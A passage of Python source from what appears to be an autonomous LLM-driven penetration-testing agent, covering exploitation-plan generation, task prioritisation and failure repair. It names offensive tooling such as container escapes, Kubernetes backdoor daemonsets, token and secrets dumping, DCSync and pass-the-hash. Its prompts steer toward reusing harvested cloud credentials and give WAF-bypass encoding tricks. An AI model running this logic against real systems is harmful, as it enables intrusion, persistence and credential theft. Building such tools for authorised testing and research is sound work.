                                        "target_url", ""))
                            ),
                        )
            plan.tasks = tasks
        except Exception as e:
            log.warning("Plan generation JSON parse failed: %s — using fallback", e)

        # Fallback: create from vulnerability hypotheses
        if not plan.tasks and self.vulnerabilities:
            plan.tasks = []
            for i, v in enumerate(self.vulnerabilities):
                params = dict(v.tool_args) if v.tool_args else (
                    {"url": v.endpoint, "param": v.param}
                    if v.param else {"url": v.endpoint}
                )
                # Inject suggested payloads from RAG analysis
                if v.suggested_payloads:
                    params["payload"] = v.suggested_payloads[0]
                    if len(v.suggested_payloads) > 1:
                        params["payload_batch"] = list(v.suggested_payloads)
                plan.tasks.append(
                    Task(
                        id=f"task-{i+1}",
                        type="task",
                        goal=f"Test {v.vuln_type} on {v.endpoint}",
                        instruction=(
                            f"Test {v.vuln_type} on {v.endpoint}"
                            + (f" param={v.param}" if v.param else "")
                        ),
                        hypothesis=v.vuln_type,
                        rationale=v.evidence[:100] if v.evidence else f"Hypothesized {v.vuln_type}",
                        evidence=list(v.research_techniques),
                        action={
                            "tool": v.suggested_tool or self._guess_tool(
                                v.vuln_type, endpoint=v.endpoint or "",
                            ),
                            "target": v.endpoint,
                            "params": params,
                        },
                        status=TaskStatus.READY,
                        vuln_type=v.vuln_type,
                    )
                )

        # Fallback 2: no hypotheses at all. If DKG still holds API/POST/JSON
        # endpoints, generate bounded route-verification recon tasks so the
        # plan is not empty. These tasks only confirm endpoints and capture
        # response structure — exploit tasks are added later by replan only
        # once verification surfaces an input, abnormal response or secrets.
        if not plan.tasks and not self.vulnerabilities:
            api_endpoints = self._collect_api_verification_endpoints()
            if api_endpoints:
                log.info(
                    "Plan fallback: analyze produced no vulnerability hypotheses; "
                    "generating route-verification tasks for %d API endpoint(s)",
                    len(api_endpoints),
                )
                plan.tasks = self._build_api_verification_tasks(api_endpoints)
            else:
                log.warning(
                    "Plan empty: no vulnerability hypotheses and no API/POST/JSON "
                    "endpoints in DKG to verify — nothing actionable to plan. "
                    "Generated 0 tasks."
                )

        plan.updated_at = time.strftime("%Y-%m-%dT%H:%M:%S")

        # Sanitize: replace blacklisted tools (e.g. hydra_ssh_brute → ssh_exec)
        self._sanitize_plan_tools(plan.tasks)
        self._apply_priority_hints(plan.tasks)

        # ── Plan generation summary ─────────────────────────────────
        done = sum(1 for t in plan.tasks if t.status is TaskStatus.SUCCESS)
        pending = sum(
            1 for t in plan.tasks
            if t.status in (TaskStatus.READY, TaskStatus.CREATED)
        )
        print(f"\n[PLAN] Generated {len(plan.tasks)} tasks ({done} done, {pending} pending)")
        for t in plan.tasks[:12]:
            status = t.status.value.upper()
            deps = dependency_task_ids(t)
            dep_str = f" (depends on: {', '.join(deps)})" if deps else ""
            print(f"  [{status:<8}] {t.instruction[:100]}{dep_str}")
        if len(plan.tasks) > 12:
            print(f"  ... and {len(plan.tasks) - 12} more tasks")

        # Task-level plan state is persisted alongside the DKG snapshots.
        self._persist_plan("plan")
        return plan

    def _collect_api_verification_endpoints(self, max_items: int = 8) -> list[dict]:
        """DKG Endpoints worth verifying when analysis found no hypotheses.

        Includes POST/non-GET endpoints, JSON/form body endpoints and endpoints
        whose OPTIONS Allow header advertised POST. Deduplicated by
        (url, method, params) and bounded to ``max_items``.
        """
        endpoints: list[dict] = []
        seen: set[tuple[str, str, tuple[str, ...]]] = set()
        for ep in self.dkg.query_nodes("Endpoint"):
            url = (ep.get("url") or "").strip()
            if not url.startswith(("http://", "https://")):
                continue
            method = str(ep.get("method", "GET") or "GET").upper()
            body_format = str(ep.get("body_format", "") or "").lower()
            content_type = str(ep.get("sample_content_type", "") or "").lower()
            allow = str(ep.get("allow_methods", "") or "").upper()
            is_api = (
                method not in ("GET", "")
                or body_format in ("json", "form")
                or "json" in content_type
                or "POST" in allow
            )
            if not is_api:
                continue
            params = tuple(
                p for p in str(ep.get("params", "") or "").split(",") if p
            )
            key = (url, method, params)
            if key in seen:
                continue
            seen.add(key)
            endpoints.append({
                "url": url, "method": method,
                "params": list(params), "body_format": body_format,
            })
            if len(endpoints) >= max_items:
                break
        return endpoints

    def _build_api_verification_tasks(
        self, endpoints: list[dict], max_tasks: int = 6
    ) -> list[Task]:
        """Bounded route-verification recon tasks (never vulnerability claims).

        POST/JSON endpoints get a controlled generic JSON probe (``{}`` when no
        parameter schema exists — parameters are never invented). Other API
        endpoints get method probing plus response structure capture. Tasks are
        deduplicated by URL/method/parameter combination.
        """
        tasks: list[Task] = []
        seen_combos: set[tuple[str, str, str]] = set()
        for ep in endpoints:
            url = ep["url"]
            method = ep["method"]
            params = ep.get("params") or []
            combo = (url, method, ",".join(params))
            if combo in seen_combos:
                continue
            seen_combos.add(combo)
            if len(tasks) >= max_tasks:
                break
            task_id = f"task-api-verify-{len(tasks) + 1}"
            if method == "POST" and ep.get("body_format") == "json":
                body = json.dumps({p: f"sample_{p}" for p in params}) if params else "{}"
                tasks.append(Task(
                    id=task_id,
                    type="task",
                    goal=f"Verify POST JSON endpoint {url}",
                    instruction=(
                        f"Confirm the POST JSON endpoint {url} and capture its response "
                        "structure. Send a controlled generic JSON probe "
                        f"(body: {body}). Record status, Content-Type, response body and "
                        "any declared input parameters. Do NOT claim a vulnerability — "
                        "this is route verification, not exploitation."
                    ),
                    action={
                        "tool": "http_method_probe", "target": url,
                        "params": {
                            "url": url, "method": "POST", "data": body,
                            "content_type": "application/json",
                        },
                    },
                    status=TaskStatus.READY,
                    vuln_type="RouteVerification",
                    source="api-route-verification",
                ))
            else:
                tasks.append(Task(
                    id=task_id,
                    type="task",
                    goal=f"Verify API endpoint {url}",
                    instruction=(
                        f"Confirm the API endpoint {url} (method {method}) and parse its "
                        "response structure. Use http_method_probe (OPTIONS) or curl_get, "
                        "then response_parse on the body. Record status, Allow methods, "
                        "Content-Type and interesting fields. Do NOT claim a vulnerability — "
                        "this is route verification, not exploitation."
                    ),
                    action={
                        "tool": "http_method_probe", "target": url,
                        "params": {"url": url, "method": method},
                    },
                    status=TaskStatus.READY,
                    vuln_type="RouteVerification",
                    source="api-route-verification",
                ))
        return tasks

    def _guess_tool(self, vuln_type: str, endpoint: str = "",
                    method: str = "") -> str:
        """Map a vuln type to a default tool when no suggested_tool is given.

        A read-only default is only valid when the request itself can be a
        read. When the target documents the route as a write (or the caller
        already knows the required verb), a tool that cannot express it would
        only ever produce a 405 that reads like "the hypothesis was wrong".
        """
        vt = vuln_type.lower()
        _declared = {str(m).strip().upper() for m in str(method or "").split(",") if m.strip()}
        if not _declared and endpoint:
            try:
                _declared = self._endpoint_declared_methods(str(endpoint))
            except Exception as exc:
                log.debug("declared-method lookup failed for %s: %s", endpoint, exc)
        if _declared:
            _capable = http_tools_for(sorted(_declared), body_kind="json")
            _read_only_default = self._read_only_default_tool(vt)
            if _capable and (
                not _read_only_default
                or not http_tool_can_express(_read_only_default, _declared)
            ):
                return _capable[0]
        return self._read_only_default_tool(vt)

    @staticmethod
    def _read_only_default_tool(vuln_type: str) -> str:
        """Read-class tool for a vuln type (the pre-existing mapping)."""
        vt = vuln_type.lower()
        if "sql" in vt: return "sqlmap_test"
        if "xss" in vt: return "xss_reflection_test"
        if "cmdi" in vt or "command" in vt: return "command_injection_test"
        if "ssti" in vt: return "send_payload"
        if any(kw in vt for kw in _WRITE_VULN_KEYWORDS):
            return _WRITE_DEFAULT_TOOL
        if "lfi" in vt or "path" in vt: return "curl_get"
        if "idor" in vt: return "curl_get"
        if "ssrf" in vt: return "curl_get"
        return "curl_get"

    def _http_alternative_block(self, tool: str) -> str:
        """Prompt block listing HTTP tools the fix may switch to.

        A method mismatch is the failure class where parameter repair cannot
        help: the current tool cannot send the verb the target asks for. The
        fix LLM can only name a valid alternative if it is shown the tools
        (and their parameter contracts) that can express a non-GET request.
        """
        _specs: dict = {}
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                _specs.update(_gw.get_tool_specs())
            except Exception as exc:
                log.debug("spec lookup failed: %s", exc)
        _lines: list[str] = []
        for name in http_tools_for(["POST"], available=_specs):
            if name == tool:
                continue
            spec = _specs.get(name)
            if spec is not None and not is_available(spec):
                continue
            _lines.append(f"  - {name}:")
            _lines.append(f"    {name}{self._render_tool_params(name)}")
        if not _lines:
            return ""
        return (
            "\nAllowed tool alternatives (use exactly these names):\n"
            + "\n".join(_lines) + "\n"
        )

    def _render_tool_params(self, tool: str) -> str:
        """Declared parameter contract of ``tool`` for the fix-analysis prompt.

        The fix LLM only sees the failure text, so without the contract it
        guesses shapes (dict body, json= key) that the tool does not accept.
        """
        for _gw in (self.attack_gateway, self.recon_gateway):
            try:
                spec = _gw.get_tool_specs().get(tool)
            except Exception as exc:
                log.debug("tool spec lookup failed for %s: %s", tool, exc)
                continue
            if spec is None:
                continue
            params = dict(getattr(spec, "parameters", {}) or {})
            if not params:
                return "  (no declared parameters)"
            lines = []
            for name, schema in params.items():
                schema = schema if isinstance(schema, dict) else {}
                ptype = str(schema.get("type", "string"))
                if "default" in schema:
                    lines.append(
                        f"  - {name}: {ptype} (optional, "
                        f"default={schema['default']!r})"
                    )
                else:
                    lines.append(f"  - {name}: {ptype} (REQUIRED)")
            return "\n".join(lines)
        return "  (tool contract unavailable)"

    @staticmethod
    def _task_from_llm_dict(d: dict) -> Task:
        """Build a typed Task from a raw LLM task dict (lenient fallback).

        Used only when the pydantic plan schema failed and the legacy
        tolerant extraction produced unvalidated dicts. Status strings map
        onto TaskStatus with the legacy vocabulary; unknown statuses become
        CREATED (safe, never executable).
        """
        params = d.get("params", {})
        if isinstance(params, str):
            try:
                params = json.loads(params)
            except (json.JSONDecodeError, TypeError):
                params = {"url": str(params)}
        if not isinstance(params, dict):
            params = {"value": params}
        deps = d.get("dependent_task_ids") or d.get("dependencies") or []
        if not isinstance(deps, list):
            deps = [deps]
        status_str = str(d.get("status", "pending") or "pending")
        status_map = {
            "pending": TaskStatus.READY,
            "done": TaskStatus.SUCCESS,
            "failed": TaskStatus.FAILED,
            "skipped": TaskStatus.ABANDONED,
            "exhausted": TaskStatus.ABANDONED,
        }
        status = status_map.get(status_str)
        if status is None:
            try:
                status = TaskStatus(status_str)
            except ValueError:
                status = TaskStatus.CREATED
        action = {
            "tool": str(d.get("tool", "") or ""),
            "target": str(d.get("endpoint", "") or ""),
            "params": params,
        }
        dependencies = deps_from_task_ids(deps)
        path_dependency = _attack_path_dependency(action, str(d.get("instruction", "") or ""))
        if path_dependency:
            dependencies.append(path_dependency)
        return Task(
            id=str(d.get("id", "")),
            type=d.get("type", "task"),
            goal=d.get("goal", "") or d.get("instruction", "") or "",
            instruction=str(d.get("instruction", "") or ""),
            action=action,
            dependencies=dependencies,
            priority=float(d.get("priority", 0.5)),
            status=status,
            source=str(d.get("source", "") or ""),
            vuln_type=str(d.get("vuln_type", "") or ""),
            source_knowledge_ids=[
                str(item) for item in (d.get("source_knowledge_ids") or [])
            ],
            success_condition=normalize_success_condition(
                d.get("success_condition")
            ),
        )

    def _topological_sort(self, tasks: list[Task]) -> list[Task]:
        """Sort tasks by dependency order using Kahn's algorithm."""
        from collections import deque
        task_map = {t.id or str(id(t)): t for t in tasks}
        in_degree = {tid: 0 for tid in task_map}
        adj = {tid: [] for tid in task_map}
        for t in tasks:
            tid = t.id or str(id(t))
            for dep_id in dependency_task_ids(t):
                if dep_id in task_map:
                    adj[dep_id].append(tid)
                    in_degree[tid] += 1
                else:
                    log.warning("Task '%s' depends on unknown task '%s' — ignored", tid, dep_id)
        queue = deque([tid for tid, deg in in_degree.items() if deg == 0])
        result = []
        while queue:
            tid = queue.popleft()
            result.append(task_map[tid])
            for neighbor in adj[tid]:
                in_degree[neighbor] -= 1
                if in_degree[neighbor] == 0:
                    queue.append(neighbor)
        result.extend([task_map[tid] for tid in in_degree if tid not in {r.id for r in result}])
        return result

    @staticmethod
    def _detect_cycle(tasks: list[Task]) -> list[str]:
        """Detect cycles in task dependency graph using DFS.

        Returns list of task IDs involved in the first cycle found, or empty list.
        """
        task_map = {t.id or str(id(t)): t for t in tasks}
        visited: set[str] = set()
        rec_stack: set[str] = set()
        parent_map: dict[str, str | None] = {}

        def _dfs(tid: str) -> list[str] | None:
            if tid in visited:
                return None
            if tid in rec_stack:
                cycle = [tid]
                cur = tid
                for _ in range(len(task_map) + 1):
                    prev = parent_map.get(cur)
                    if prev is None or prev == tid:
                        break
                    cur = prev
                    cycle.append(cur)
                cycle.append(tid)
                return cycle[::-1]
            if tid not in task_map:
                return None
            rec_stack.add(tid)
            for dep_id in dependency_task_ids(task_map[tid]):
                if dep_id in task_map:
                    parent_map[dep_id] = tid
                    result = _dfs(dep_id)
                    if result:
                        rec_stack.discard(tid)
                        return result
            rec_stack.discard(tid)
            visited.add(tid)
            return None

        for tid in task_map:
            if tid not in visited:
                result = _dfs(tid)
                if result:
                    return result
        return []

    @staticmethod
    def _break_cycle(tasks: list[Task], cycle: list[str]) -> None:
        """Break a dependency cycle by removing the last edge in the cycle."""
        if len(cycle) < 2:
            return
        last = cycle[-1]
        for t in tasks:
            deps = [d for d in (t.dependencies or [])]
            for d in deps:
                if isinstance(d, dict) and d.get("type") == "requires_task_success" and d.get("task_id") == last:
                    t.dependencies.remove(d)
                    return
                if d == last:
                    t.dependencies.remove(d)
                    return

    def _select_next_plan_task(self, plan: ExploitationPlan | None = None) -> Task | None:
        """Return the first pending task whose dependencies are all done.

        Exploit tasks (command_injection_test, sqlmap_test, etc.) are prioritized
        over probe tasks (curl_get, http_post) to ensure exploitation happens
        before passive reconnaissance in the plan loop.
        """
        plan = plan or self.exploitation_plan
        if not plan or not plan.tasks:
            return None
        _EXPLOIT_PRIORITY = {
            "command_injection_test", "sqlmap_test", "send_payload",
            "xss_reflection_test", "ffuf_fuzz",
            # HTTP exploitation (form-based API exploits, auth bypass, etc.)
            "http_post", "form_extract",
            "redis_cmd", "mysql_query", "psql_query", "mssql_query", "mssqlclient_query",
            "oracle_query", "tomcat_exploit", "php_filter_chain",
            "jwt_forge", "impacket_psexec", "impacket_wmiexec",
            "impacket_pth", "impacket_ticketer", "impacket_silver_ticket",
            "impacket_secretsdump", "impacket_secretsdump_dcsync",
            "impacket_GetUserSPNs", "impacket_GetNPUsers",
            # Container escape tools
            "container_escape_docker_sock", "container_escape_docker_api",
            "container_escape_cgroup", "container_escape_mount_disk",
            "container_escape_cap_dac", "container_escape_procfs",
            "container_escape_runc", "nsenter_exec", "crictl_cmd",
            # Container recon (prerequisite for escape)
            "check_capabilities", "check_mounts",
            "container_find_sockets", "container_find_docker", "container_recon_env",
            # K8s exploitation and post-exploitation
            "kubectl_exec", "kubectl_run",
            "k8s_secret_dump", "k8s_configmap_dump", "k8s_sa_token_steal",
            "k8s_kubelet_exec", "k8s_etcd_keys", "etcdctl_get",
            "k8s_backdoor_daemonset", "k8s_backdoor_cronjob",
            # K8s enumeration (prerequisite for exploitation)
            "kubectl_get_pods", "kubectl_get_secrets",
            "kubectl_get_clusterrolebindings", "kubectl_auth_check",
            "sa_token_read", "kubelet_probe",
            # Cloud exploitation
            "aws_cli", "aws_iam_federation", "check_cloud_metadata",
            "ssrf_probe",
            # Post-exploitation and lateral movement
            "ssh_exec", "shell_exec", "ssh_key_exec",
            "linux_priv_check", "file_upload",
            # Additional exploit tools
            "xxe_inject", "ssti_inject", "graphql_introspect",
            "wpscan_enum", "oracle_tns_poison", "smbmap_enum",
            "gpp_decrypt", "hash_crack", "smb_client",
            "test_credential",
        }
        _LOW_PRIORITY = {
            "hydra_http_brute", "hydra_ssh_brute",
        }
        ready_exploit = []
        ready_probe = []
        ready_low = []
        for task in self._topological_sort(plan.tasks):
            if task.status is TaskStatus.ABANDONED or task.id in self._exhausted_task_ids:
                continue
            if task.status not in (TaskStatus.READY, TaskStatus.CREATED):
                continue
            dep_ids = dependency_task_ids(task)
            deps_met = True
            all_deps_failed = True if dep_ids else False
            for dep_id in dep_ids:
                dep_task = next((t for t in plan.tasks if t.id == dep_id), None)
                if not dep_task or dep_task.status not in (
                    TaskStatus.SUCCESS,
                    TaskStatus.FAILED,
                    TaskStatus.ABANDONED,
                ):
                    deps_met = False
                    break
                if dep_task.status is not TaskStatus.FAILED:
                    all_deps_failed = False
            # When ALL credential-test dependencies failed, the dependent task
            # cannot succeed (e.g. "If any credential succeeded, enumerate DBs"
            # when every credential task returned Login failed).
            if deps_met and all_deps_failed:
                task.status = TaskStatus.ABANDONED
                continue
            if deps_met:
                tool = str((task.action or {}).get("tool", "") or "")
                source = task.source
                # Semantic priority: task instructions containing exploit
                # keywords (bypass, exploit, assume, inject, takeover, etc.)
                # are exploitation tasks regardless of their declared tool.
                _EXPLOIT_KEYWORDS = [
                    "bypass", "exploit", "assume", "escalat",
                    "inject", "takeover", "token", "flag",
                    " privilege", "admin role", "forgery",
                ]
                def _has_exploit_semantics(t: Task) -> bool:
                    inst = (t.instruction or "").lower()
                    return any(kw in inst for kw in _EXPLOIT_KEYWORDS)
                # Credential-hint tasks unlock downstream exploitation and
                # should execute ASAP — treat them as exploit-priority
                # regardless of their tool type.
                if (source == "credential-hint" or tool in _EXPLOIT_PRIORITY
                        or _has_exploit_semantics(task)):
                    ready_exploit.append(task)
                elif tool in _LOW_PRIORITY:
                    ready_low.append(task)
                else:
                    ready_probe.append(task)
        return (ready_exploit[0] if ready_exploit
                else (ready_probe[0] if ready_probe
                      else (ready_low[0] if ready_low else None)))

    def _extract_recent_artifacts(self) -> str | None:
        """Extract recently discovered intermediate artifacts from DKG state.

        Called after systematic pass and plan-driven task completions to inject
        a summary of recently discovered credentials, endpoints, files, and
        sessions into the LLM context for subsequent task decisions.

        Returns a context message string, or None if nothing new to report.
        """
        parts: list[str] = []
        try:
            creds = self.dkg.query_nodes("Credential")
            if creds:
                recent_creds = [c for c in creds if c.get("confirmed")]
                if recent_creds:
                    parts.append("New confirmed credentials:")
                    for c in recent_creds[-4:]:
                        parts.append(
                            f"  {c.get('cred_type','?')} {c.get('username','?')}"
                            f" @ {c.get('source_host','?')}"
                        )
                # Also surface unconfirmed AWS/cloud credentials — they are
                # actionable even without explicit confirmation (e.g. IMDS
                # metadata extraction yields access keys that DAVE cannot
                # independently verify through a login test).
                _aws_creds = [
                    c for c in creds
                    if not c.get("confirmed")
                    and any(kw in str(c.get("cred_type", "")).lower()
                           for kw in ("aws", "iam", "sts", "s3", "cloud"))
                ]
                for c in _aws_creds[-2:]:
                    ct = c.get("cred_type", "cloud")
                    cuser = c.get("username", "") or c.get("access_key_id", "") or ""
                    chost = c.get("source_host", "") or c.get("host", "") or ""
                    parts.append(
                        f"  [UNCONFIRMED BUT ACTIONABLE] {ct} credential"
                        + (f" {cuser}" if cuser else "")
                        + (f" @ {chost}" if chost else "")
                        + " — use with aws_cli / aws_sts_query / aws_iam_federation"
                    )
            # ── Cryptographic artifacts ──
            # Scan Analysis nodes and Endpoint responses for private keys,
            # PEM certificates, and JWT tokens that may enable federation
            # attacks (SAML / OIDC).  These are often missed because the
            # simple "credentials → test_credential" pipeline doesn't know
            # what to do with raw key material.
            for an in self.dkg.query_nodes("Analysis"):
                ev = str(an.get("evidence", "") or an.get("summary", "") or an.get("findings", "") or "")
                if "-----BEGIN" in ev:
                    parts.append(
                        "PEM / private key material found in analysis output"
                        + " — consider saml_forge → aws_cli assume-role-with-saml"
                    )
                    break

            sessions = self.dkg.query_nodes("Session")
            if sessions:
                parts.append(f"Active sessions ({len(sessions)}):")
                for s in sessions[-4:]:
                    parts.append(
                        f"  {s.get('session_type','?')} on {s.get('host','?')}"
                    )

            # Extract file paths / URLs from recent Endpoint discoveries
            eps = self.dkg.query_nodes("Endpoint")
            recent_eps = [
                e for e in eps
                if e.get("discovered_by") and "deep_recon" in str(e.get("discovered_by", ""))
            ]
            if recent_eps:
                parts.append(f"Recently discovered paths ({len(recent_eps)}):")
                for ep in recent_eps[-6:]:
                    parts.append(f"  {ep.get('url','') or ep.get('uri','')}")
        except Exception:
            return None

        if not parts:
            return None

        return (
            "[INTERMEDIATE ARTIFACTS — recent task results]\n"
            + "\n".join(parts)
            + "\nUse these in subsequent exploitation tasks."
        )

    def _build_defense_evasion_context(self) -> str:
        """Build defense-aware evasion guidance for the plan generation prompt.

        When DPM detects active defenses (WAF, Process Hiding, LOTL), inject
        specific guidance so the LLM adapts its exploitation strategy.
        """
        if not self.defense_state or self.defense_state.defense_complexity < 0.1:
            return ""

        parts: list[str] = []
        ds = self.defense_state

        if ds.waf_type and ds.waf_type != "none":
            parts.append(
                f"**WAF Detected ({ds.waf_type})**: All payloads MUST be encoded BEFORE sending. "
                f"Proactive bypass strategy (apply in order):\n"
                f"  1. Double URL encoding: %25%33%63 → %3c\n"
                f"  2. Case alternation: SeLeCt, UnIoN, FrOm\n"
                f"  3. Inline comments: SEL/**/ECT, UN/**/ION\n"
                f"  4. HTML entity encoding: &#x3c; for <\n"
                f"  5. Parameter pollution: add duplicate params with junk values\n"
                f"  6. Content-Type switch: try multipart/form-data instead of JSON\n"
                f"For SQL injection with WAF, use sqlmap_test with tamper scripts. "
                f"For other payload types, use send_payload with encoding='url_double' or encoding='html_entity'."
            )

        if getattr(ds, 'defense_category_scores', None):
            scores = ds.defense_category_scores
            if isinstance(scores, dict):
                if scores.get("honey", 0) > 0.3:
                    parts.append(
                        "**Honeypot Detected**: Be suspicious of unusually easy credentials, "
                        "obvious flag locations (/flag.txt), and unrestricted access to sensitive "
                        "endpoints. Always verify flags through DAVE."
                    )
                if scores.get("trap", 0) > 0.3:
                    parts.append(
                        "**Trap Detected**: Avoid infinite-loop endpoints, extremely large "
                        "responses, and requests that trigger repeated redirects."
                    )
                if scores.get("cloak", 0) > 0.3:
                    parts.append(
                        "**Cloak Detected**: Some services/ports may be hidden or respond "
                        "slowly. Probe non-standard ports and use timing analysis."
                    )

        if not parts:
            return ""

        return "## Active Defenses (adapt your attack strategy)\n" + "\n".join(parts) + "\n"

    @staticmethod
    def _summarize_task_result(
        tc_names: list[str], success: bool, all_stdouts: list[str]
    ) -> str:
        """Build a summary of task execution result for plan review.

        Includes ALL tool call outputs so the plan-review LLM (which runs
        in a separate call and can't see conversation history) understands
        everything that was discovered.
        """
        if not all_stdouts:
            return "no output"
        # Show up to 3 tool outputs (first, middle if 3+, last if different)
        result_parts: list[str] = []
        n = len(all_stdouts)
        if n <= 2:
            for i, s in enumerate(all_stdouts):
                result_parts.append(s[:600])
        else:
            result_parts.append(all_stdouts[0][:600])
            if n > 2:
                result_parts.append(all_stdouts[n // 2][:400])
            result_parts.append(all_stdouts[-1][:600])
        return "\n---\n".join(result_parts)

    def _format_plan_status(self) -> str:
        """Format plan progress for LLM prompts."""
        plan = getattr(self, 'exploitation_plan', None)
        if not plan or not plan.tasks:
            return "(no plan)"
        # Keep the human/LLM-facing summary aligned with the same dependency
        # semantics used by ParityScheduler.  Without this refresh, semantic
        # attack-path dependencies remain displayed as READY even though the
        # scheduler correctly sees them as BLOCKED.
        try:
            _graph = TaskGraph(list(plan.tasks))
            _state = self._get_state()
            _paths = getattr(getattr(_state, "topology", None), "attack_paths", [])
            _graph.refresh_states({
                "attack_paths": [
                    {"path_id": str(getattr(p, "path_id", "")),
                     "status": str(getattr(p, "status", "active"))}
                    for p in _paths if getattr(p, "path_id", "")
                ]
            })
        except Exception as exc:
            log.debug("swallowed exception: %s", exc, exc_info=True)
        done = sum(1 for t in plan.tasks if t.status is TaskStatus.SUCCESS)
        failed = sum(
            1 for t in plan.tasks
            if t.status in (TaskStatus.FAILED, TaskStatus.ABANDONED)
        )
        pending = sum(
            1 for t in plan.tasks
            if t.status in (TaskStatus.READY, TaskStatus.CREATED)
        )
        blocked = sum(1 for t in plan.tasks if t.status is TaskStatus.BLOCKED)
        exhausted = sum(
            1 for t in plan.tasks
            if t.status is TaskStatus.ABANDONED or t.id in self._exhausted_task_ids
        )
        lines = [f"## Exploitation Plan ({done}/{len(plan.tasks)} done, {failed} failed, {exhausted} exhausted, {pending} pending, {blocked} blocked)"]
        for t in self._topological_sort(plan.tasks):
            status = t.status.value.upper()
            deps = dependency_task_ids(t)
            dep_str = f" (waits for: {', '.join(deps)})" if deps else ""
            reason = ""
            if t.status is TaskStatus.BLOCKED:
                reason = " (blocked: dependency/precondition unmet)"
            lines.append(f"  {t.id}: [{status}] {t.instruction[:100]}{dep_str}{reason}")
        return "\n".join(lines)

    def _build_cycle_summary(self) -> "CycleTransitionSummary":
        """Build a structured summary of the current cycle's progress.

        Tracks deltas (new discoveries since last cycle) and surfaces
        failed/successful approaches so the LLM knows what to avoid/repeat.
        """
        from darwin.data_model import CycleTransitionSummary

        plan = getattr(self, 'exploitation_plan', None)
        tasks_done = sum(
            1 for t in (plan.tasks or [])
            if t.status is TaskStatus.SUCCESS
        ) if plan else 0
        tasks_failed = sum(
            1 for t in (plan.tasks or [])
            if t.status is TaskStatus.FAILED
        ) if plan else 0
        tasks_exhausted = sum(
            1 for t in (plan.tasks or [])
            if t.status is TaskStatus.ABANDONED or t.id in self._exhausted_task_ids
        ) if plan else 0

        failed_approaches = []
        successful_approaches = []
        if plan:
            for t in plan.tasks:
                instr = t.instruction
                if t.status is TaskStatus.FAILED:
                    failed_approaches.append(instr)
                elif t.status is TaskStatus.SUCCESS:
                    successful_approaches.append(instr)

        state = self._get_state()
        flags_found = [str(f) for f in state.flags[:3]]

        prev_ep = getattr(self, '_prev_endpoint_count', 0)
        prev_cred = getattr(self, '_prev_credential_count', 0)
        prev_vuln = getattr(self, '_prev_vulnerability_count', 0)
        new_ep = max(0, len(state.endpoints) - prev_ep)
        new_cred = max(0, len(state.credentials) - prev_cred)
        new_vuln = max(0, len(state.vulnerabilities) - prev_vuln)
        self._prev_endpoint_count = len(state.endpoints)
        self._prev_credential_count = len(state.credentials)
        self._prev_vulnerability_count = len(state.vulnerabilities)

        # No-progress detection: terminate if consecutive loops produce nothing
        if new_ep == 0 and new_cred == 0 and new_vuln == 0 and not flags_found:
            self._no_progress_loops += 1
        else:
            self._no_progress_loops = 0

        highest_vuln = ""
        if self.vulnerabilities:
            best = max(self.vulnerabilities, key=lambda v: v.confidence, default=None)
            if best:
                highest_vuln = f"{best.vuln_type} @ {best.endpoint} ({best.confidence:.0%})"

        return CycleTransitionSummary(
            cycle_number=self._loop_count,
            flags_found=flags_found,
            tasks_completed=tasks_done,
            tasks_failed=tasks_failed,
            tasks_exhausted=tasks_exhausted,
            new_endpoints=new_ep,
            new_credentials=new_cred,
            new_vulnerabilities=new_vuln,
            defense_changed=bool(self.defense_state.waf_type),
            waf_type=self.defense_state.waf_type or "",
            failed_approaches=failed_approaches[-10:],
            successful_approaches=successful_approaches[-5:],
            active_sessions=[s.get("host", "") for s in self.dkg.query_nodes("Session")],
            highest_confidence_vuln=highest_vuln,
        )

    async def _analyze_and_fix_task(
        self, task: Task, output: str
    ) -> dict | None:
        """Ask LLM whether task failure is fixable (wrong params) or not.

        Returns dict with corrected_params + reason if fixable, None otherwise.
        """
        instruction = (task.instruction or "")[:200]
        _action = task.action or {}
        tool = str(_action.get("tool", "") or "")
        params = _action.get("params", {}) or {}
        # The same failing call cannot be repaired twice by asking again: the
        # benchmark logs show one task analysed three times with an identical
        # verdict, each round costing a 60-180s LLM call. Analyse each
        # (task, tool, params) signature once; a real repair changes the
        # signature and gets its own analysis.
        try:
            _signature = (task.id, tool, json.dumps(params, sort_keys=True, default=str))
        except (TypeError, ValueError):
            _signature = (task.id, tool, str(params))
        if not hasattr(self, "_fix_signatures"):
            self._fix_signatures: dict[tuple, int] = {}
        if int(self._fix_signatures.get(_signature, 0)) >= 1:
            log.warning(
                "task=%s: identical failure on %s already analysed — "
                "treating as not fixable",
                task.id, tool or "?",
            )
            return None
        self._fix_signatures[_signature] = int(self._fix_signatures.get(_signature, 0)) + 1
        params_str = json.dumps(params)
        output_trunc = output[:1500]

        # ── P6: rule-based failure classification first (Evaluator) ──
        _cls_result = CoreExecutionResult(
            task_id=task.id,
            tool=tool,
            planned_tool=tool,
            adherence=True,
            success=False,
            stdout=output[:4000],
            stderr="",
            exit_code=-1,
            elapsed_ms=0.0,
        )
        _evaluation = await self.evaluator.evaluate(
            task, _cls_result
        )
        self._task_log_event(
            "info", "task_evaluated",
            task_id=task.id,
            outcome=_evaluation.outcome.value,
            failure_type=(
                _evaluation.failure_type.value if _evaluation.failure_type else None
            ),
            confidence_delta=_evaluation.confidence_delta,
            replan=_evaluation.replan.value,
            evidence=_evaluation.evidence[:5],
        )
        # Parameter-fixing cannot help these: short-circuit the LLM fix call.
        _NO_LLM_FIX_TYPES = {
            FailureType.HYPOTHESIS_REJECTED,
            FailureType.TARGET_UNREACHABLE,
            FailureType.DEFENSE_BLOCKED,
            FailureType.BUDGET_EXCEEDED,
            FailureType.STRATEGY_FAILED,
        }
        if _evaluation.failure_type in _NO_LLM_FIX_TYPES:
            log.info(
                "[EVAL] task %s → %s (rule-based, no LLM fix)",
                task.id,
                _evaluation.failure_type.value,
            )
            return None

        # Meta-cognition: auto-search RAG when unfamiliar technology detected
        rag_hint = ""
        output_lower = output.lower()
        _unfamiliar_keywords = [
            "unrecognized", "unknown protocol", "not supported", "no tool available",
            "unsupported service", "cannot connect", "no handler", "not implemented",
        ]
        if any(kw in output_lower for kw in _unfamiliar_keywords):
            # Try to extract service/technology name from task instruction
            svc_match = re.search(
                r'(?:mysql|postgresql|redis|mongo|oracle|mssql|elasticsearch|couchdb'
                r'|memcached|rabbitmq|kafka|zookeeper|etcd|consul|nacos)',
                instruction.lower()
            )
            svc_name = svc_match.group(0) if svc_match else ""
            if svc_name:
                try:
                    from darwin.rag import get_rag
                    from darwin.precedent_store import current_prior
                    from darwin.rag_query import (
                        build_capability_query,
                        domains_from_dkg,
                        environment_from_dkg,
                    )
                    rag = get_rag()
                    rag_results = rag.retrieve(
                        build_capability_query(
